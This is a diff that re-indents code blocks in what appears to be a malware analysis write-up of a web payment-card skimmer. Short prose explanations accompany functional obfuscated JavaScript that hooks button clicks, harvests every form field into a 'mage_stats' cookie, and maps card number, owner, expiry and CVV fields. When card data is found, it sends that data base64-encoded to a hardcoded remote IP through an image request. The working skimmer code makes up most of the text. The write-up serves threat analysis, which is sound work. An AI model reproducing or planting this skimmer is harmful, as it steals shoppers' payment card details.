@@ -177,7 +177,7 @@ if(window["location"]["href"]["indexOf"](_a("Y2hlY2tvdXQ="))>0) //Y2hlY2tvdXQ= -
     },0x12c);
    }
   },0x7d0);
-    },0x12c);
+ },0x12c);
    ``` 
 
 <h6>The final code check if the last operation has done and that the cybersource solution are present on the page. If exists, this parse the data of fields of the form and add to the arrays. Once done, this convert to JSON, push in base64 the content and send a request to URL by the C2. This doesn't wait a reply, this only for sending the data to the C2 by URL requests, the group use a regex for extract all data from theirs logs of theirs C2 domains. Once performed, the script delete the informations on the localstorage as anti-forensic method.</h6>
@@ -248,8 +248,8 @@ docReady(function()
         var r="";
         for(i= 0;i< this["length"];i++)
         {
-  id= this["charCodeAt"](i).toString(16);
-  r+= ("000"+ id)["slice"](-4);
+            id= this["charCodeAt"](i).toString(16);
+            r+= ("000"+ id)["slice"](-4);
         }
         return r;
     }
@@ -265,83 +265,83 @@ function Push_Cookie(v){document["cookie"]= v+ "=; expires=Thu, 01 Jan 1970 00:0
 <h6>The main function executed begins to crawl all the fields of the pages and add to the cookie the data.</h6>
 
  ```js
-function main()
+ function main()
 {
-  var b=document["getElementsByTagName"]("button");
-  for(i= 0;i< b["length"];i++)
+ var b=document["getElementsByTagName"]("button");
+ for(i= 0;i< b["length"];i++)
+ {
+  b[i]["addEventListener"]("click",function()
   {
-      b[i]["addEventListener"]("click",function()
+    var Data="";
+    var f=document["getElementsByTagName"]("form");
+    document["cookie"]= "mage_stats="+ "$"+ "; path=/";
+    for(z= 0;z< f["length"];z++)
+    {
+     var inp=f[z]["getElementsByTagName"]("input");
+     var elements=f[z]["getElementsByTagName"]("select");
+     for(x= 0;x< inp["length"];x++)
+     {
+      if(inp[x]["value"]&& inp[x]["value"]!= ""&& inp[x]["type"]!= "radio"&& inp[x]["type"]!= "hidden"&& inp[x]["id"]!= "search"&& inp[x]["value"]!= "submit")
       {
-var Data="";
-var f=document["getElementsByTagName"]("form");
-document["cookie"]= "mage_stats="+ "$"+ "; path=/";
-for(z= 0;z< f["length"];z++)
-{
-    var inp=f[z]["getElementsByTagName"]("input");
-    var elements=f[z]["getElementsByTagName"]("select");
-    for(x= 0;x< inp["length"];x++)
-    {
-        if(inp[x]["value"]&& inp[x]["value"]!= ""&& inp[x]["type"]!= "radio"&& inp[x]["type"]!= "hidden"&& inp[x]["id"]!= "search"&& inp[x]["value"]!= "submit")
-        {
-  if(inp[x]["name"]&& inp[x]["name"]!= "")
-  {
-      var d=Push_Data("mage_stats");
-      d+= inp[x]["name"]+ ":"+ inp[x]["value"]+ "|";
-      document["cookie"]= "mage_stats="+ d+ "; path=/";
-  }
-  else 
-  {
-      var d=Push_Data("mage_stats");
-      d+= inp[x]["id"]+ ":"+ inp[x]["value"]+ "|";
-      document["cookie"]= "mage_stats="+ d+ "; path=/";
-  }
-        }
+       if(inp[x]["name"]&& inp[x]["name"]!= "")
+       {
+         var d=Push_Data("mage_stats");
+         d+= inp[x]["name"]+ ":"+ inp[x]["value"]+ "|";
+         document["cookie"]= "mage_stats="+ d+ "; path=/";
+       }
+       else 
+       {
+        var d=Push_Data("mage_stats");
+        d+= inp[x]["id"]+ ":"+ inp[x]["value"]+ "|";
+        document["cookie"]= "mage_stats="+ d+ "; path=/";
+       }
+      }
+     };
+     for(x= 0;x< elements["length"];x++)
+     {
+      if(elements[x]["value"]&& elements[x]["value"]!= ""&& elements[x]["type"]!= "radio"&& elements[x]["type"]!= "hidden"&& elements[x]["id"]!= "search"&& elements[x]["value"]!= "submit")
+      {
+       if(elements[x]["name"]&& elements[x]["name"]!= "")
+       {
+        var d=Push_Data("mage_stats");
+        d+= elements[x]["name"]+ ":"+ elements[x]["value"]+ "|";
+        document["cookie"]= "mage_stats="+ d+ "; path=/";
+       }
+       else 
+       {
+         var d=Push_Data("mage_stats");
+         d+= elements[x]["id"]+ ":"+ elements[x]["value"]+ "|";
+         document["cookie"]= "mage_stats="+ d+ "; path=/";
+         document["cookie"]= "mage_stats="+ d+ "; path=/";
+       }
+      }
+     }
     };
-    for(x= 0;x< elements["length"];x++)
-    {
-        if(elements[x]["value"]&& elements[x]["value"]!= ""&& elements[x]["type"]!= "radio"&& elements[x]["type"]!= "hidden"&& elements[x]["id"]!= "search"&& elements[x]["value"]!= "submit")
-        {
-         if(elements[x]["name"]&& elements[x]["name"]!= "")
-        {
-      var d=Push_Data("mage_stats");
-      d+= elements[x]["name"]+ ":"+ elements[x]["value"]+ "|";
-      document["cookie"]= "mage_stats="+ d+ "; path=/";
-  }
-  else 
-  {
-      var d=Push_Data("mage_stats");
-      d+= elements[x]["id"]+ ":"+ elements[x]["value"]+ "|";
-      document["cookie"]= "mage_stats="+ d+ "; path=/";
-      document["cookie"]= "mage_stats="+ d+ "; path=/";
-  }
-        }
-    }
-};
  ```
 
 <h6>The last part of the code is to replace the value of before send to the C2 by URL requests, this time in using the creation of an img element, by the url of the img, send the data to theirs C2 domains. This time, this doesn't remove the cookie in the cache and keep it.</h6>
 
 ```js
-Data= Push_Data("mage_stats");
-Data= Data["replace"]("card[num]","cc_number");
-Data= Data["replace"]("card[name]","cc_owner");
-Data= Data["replace"]("card[exp]","authorizenet_expiration");
-Data= Data["replace"]("payment[ccw_exp_year]","authorizenet_expiration_yr");
-Data= Data["replace"]("card[cvv]","cc_cid");
-Data= Data["replace"]("payment[ps_cc_number]","cc_number");
-Data= Data["replace"]("payment[ps_cc_owner]","cc_owner");
-Data= Data["replace"]("payment[ps_cc_exp_month]","authorizenet_expiration");
-Data= Data["replace"]("payment[ps_cc_exp_year]","authorizenet_expiration_yr");
-Data= Data["replace"]("payment[ps_cc_cid]","cc_cid");
-if(Data["indexOf"]("cc_number")!==  -1|| Data["indexOf"]("cc_cid")!==  -1|| Data["indexOf"]("cvv")!==  -1|| Data["indexOf"]("cardno")!==  -1|| Data["indexOf"]("ccNo")!==  -1|| Data["indexOf"]("securityCode")!==  -1|| Data["indexOf"]("cardNumber")!==  -1|| Data["indexOf"]("numero_cartao")!==  -1)
-{
-    var result={referer:document["URL"],tag:"YTE4MWE2MDM3NjljMWY5OGFkOTI3ZTczNjdjN2FhNTE=",stats:btoa(Data["hexEncode"]())}; // YTE4MWE2MDM3NjljMWY5OGFkOTI3ZTczNjdjN2FhNTE= -> a181a603769c1f98ad927e7367c7aa51
-    u= "http://45.197.141.250/analytics.php?statistics_hash="+ btoa(JSON["stringify"](result));
-    var s=document["createElement"]("IMG");
-    s["src"]= u;
-    Push_Cookie("mage_stats");
-}
-      })}
+  Data= Push_Data("mage_stats");
+  Data= Data["replace"]("card[num]","cc_number");
+  Data= Data["replace"]("card[name]","cc_owner");
+  Data= Data["replace"]("card[exp]","authorizenet_expiration");
+  Data= Data["replace"]("payment[ccw_exp_year]","authorizenet_expiration_yr");
+  Data= Data["replace"]("card[cvv]","cc_cid");
+  Data= Data["replace"]("payment[ps_cc_number]","cc_number");
+  Data= Data["replace"]("payment[ps_cc_owner]","cc_owner");
+  Data= Data["replace"]("payment[ps_cc_exp_month]","authorizenet_expiration");
+  Data= Data["replace"]("payment[ps_cc_exp_year]","authorizenet_expiration_yr");
+  Data= Data["replace"]("payment[ps_cc_cid]","cc_cid");
+  if(Data["indexOf"]("cc_number")!==  -1|| Data["indexOf"]("cc_cid")!==  -1|| Data["indexOf"]("cvv")!==  -1|| Data["indexOf"]("cardno")!==  -1|| Data["indexOf"]("ccNo")!==  -1|| Data["indexOf"]("securityCode")!==  -1|| Data["indexOf"]("cardNumber")!==  -1|| Data["indexOf"]("numero_cartao")!==  -1)
+  {
+   var result={referer:document["URL"],tag:"YTE4MWE2MDM3NjljMWY5OGFkOTI3ZTczNjdjN2FhNTE=",stats:btoa(Data["hexEncode"]())}; // YTE4MWE2MDM3NjljMWY5OGFkOTI3ZTczNjdjN2FhNTE= -> a181a603769c1f98ad927e7367c7aa51
+   u= "http://45.197.141.250/analytics.php?statistics_hash="+ btoa(JSON["stringify"](result));
+   var s=document["createElement"]("IMG");
+   s["src"]= u;
+   Push_Cookie("mage_stats");
+  }
+ })}
 }main()})
  ```
 
